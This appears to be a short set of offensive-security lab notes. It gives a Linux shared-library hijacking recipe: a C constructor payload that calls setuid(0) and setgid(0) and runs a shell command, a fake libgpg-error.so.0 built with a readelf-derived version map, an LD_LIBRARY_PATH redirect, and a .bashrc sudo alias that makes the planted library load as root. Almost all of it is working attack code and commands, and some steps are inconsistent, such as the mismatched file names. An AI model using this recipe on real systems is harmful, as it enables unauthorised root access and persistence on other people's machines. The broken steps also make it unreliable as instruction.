//finding a target shared library to hijack

ldd /usr/bin/top

//here error shared library is chosen cause it won't prevent top to work successfully


//C code (hax.c)

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));

// readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
//result of above command should be include in order to avoid package version issues

void runmahpayload() {
setuid(0);
setgid(0);
printf("DLL HIJACKING IN PROGRESS \n");
system("touch /tmp/haxso.txt");
}

//create a file gpg.map with the followinig content

GPG_ERROR_1.0 {

//readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
//result of above command should be include in order to avoid package version issues

};

// the file can be built automatically as follow
`
echo 'GPG_ERROR_1.0 {' > gpg.map
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g' >> gpg.map
echo '};' >> gpg.map
`

//compile with 
gcc -Wall -fPIC -c -o hax.o hax.c

//gcc -shared -o libhax.so hax.o
gcc -shared -Wl,--version-script gpg.map -o libgpg- error.so.0 hax.o


export LD_LIBRARY_PATH=/home/offsec/ldlib/
cp libhax.so libgpg-error.so.0


//to make it run as root when sudo is used, add the followinig command at the end of .bashrc file

alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"

//alias sudo="sudo -E" works generally but when its comes to shared library, it doesn't work 
